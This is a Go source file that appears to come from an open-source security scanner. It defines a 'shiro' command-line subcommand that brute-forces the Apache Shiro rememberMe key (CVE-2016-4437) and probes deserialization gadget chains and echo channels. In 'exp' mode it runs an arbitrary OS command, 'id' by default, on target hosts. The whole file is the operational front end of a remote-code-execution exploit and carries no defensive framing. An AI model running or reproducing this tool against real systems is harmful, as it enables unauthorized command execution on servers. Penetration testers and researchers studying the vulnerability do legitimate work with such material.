package cmd

import (
    "fmt"
    "github.com/logrusorgru/aurora"
    "github.com/spf13/cobra"
    "github.com/thoas/go-funk"
    "github.com/yhy0/Jie/conf"
    "github.com/yhy0/Jie/pkg/protocols/httpx"
    "github.com/yhy0/Jie/scan/Pocs/java/shiro"
    "github.com/yhy0/logging"
    "os"
)

/**
   @author yhy
   @since 2023/8/19
   @desc //TODO
**/

var shiroCmd = &cobra.Command{
    Use:   "shiro",
    Short: "Shiro scan && exp",
    Run: func(cmd *cobra.Command, args []string) {
        for _, target := range conf.GlobalConfig.Options.Targets {
            switch conf.GlobalConfig.Options.Shiro.Mode {
            case "burp":
                key, mode := shiro.CVE_2016_4437(target, conf.GlobalConfig.Options.Shiro.Cookie, httpx.NewClient(nil))
                if key != "" {
                    // 检测利用链
                    gadget := shiro.ScanGadget(target, conf.GlobalConfig.Options.Shiro.Cookie, key, mode)
                    echos := []string{"spring", "tomcat", "tw", "header"}
                    var echo string
                    if gadget != "" {
                        for _, e := range echos {
                            res := shiro.Exploit(target, conf.GlobalConfig.Options.Shiro.Cookie, key, mode, gadget, "echo testEcho-"+e, e)
                            if funk.Contains(res, "testEcho-"+e) {
                                echo = e
                                break
                            }
                        }
                    }

                    fmt.Println(aurora.Red(fmt.Sprintf("[Success] Mode: %v Key: %v, Gadget: %v, Echo: %v", mode, key, gadget, echo)))
                }
            case "exp":
                if conf.GlobalConfig.Options.Shiro.Gadget == "" && conf.GlobalConfig.Options.Shiro.Key == "" {
                    logging.Logger.Println("gadget must be input")
                    os.Exit(1)
                }
                logging.Logger.Println(shiro.Exploit(target, conf.GlobalConfig.Options.Shiro.Cookie, conf.GlobalConfig.Options.Shiro.Key, conf.GlobalConfig.Options.Shiro.KeyMode, conf.GlobalConfig.Options.Shiro.Gadget, conf.GlobalConfig.Options.Shiro.CMD, conf.GlobalConfig.Options.Shiro.Echo))
            default:
                logging.Logger.Println("Please check your input!")
            }
        }
    },
}

func shiroCmdinit() {
    rootCmd.AddCommand(shiroCmd)
    shiroCmd.Flags().StringVarP(&conf.GlobalConfig.Options.Shiro.Mode, "mode", "m", "burp", "Specify work mode: burp exp")
    shiroCmd.Flags().StringVarP(&conf.GlobalConfig.Options.Shiro.Key, "key", "k", "", "key of target! ")
    shiroCmd.Flags().StringVar(&conf.GlobalConfig.Options.Shiro.KeyMode, "km", "CBC", "Mode of AES, eg:CBC/GCM")
    shiroCmd.Flags().StringVarP(&conf.GlobalConfig.Options.Shiro.Gadget, "gadget", "g", "", "Gadget of shiro, eg:CB183NoCC/CB192NoCC/CCK1/CCK2")
    shiroCmd.Flags().StringVarP(&conf.GlobalConfig.Options.Shiro.Echo, "echo", "e", "spring", "echo of shiro, eg:spring/tomcat")
    shiroCmd.Flags().StringVar(&conf.GlobalConfig.Options.Shiro.CMD, "cmd", "id", "Exec command(Only works on mode exec.)")
    shiroCmd.Flags().StringVarP(&conf.GlobalConfig.Options.Shiro.Cookie, "cookie", "c", "rememberMe", "custom cookie")
}
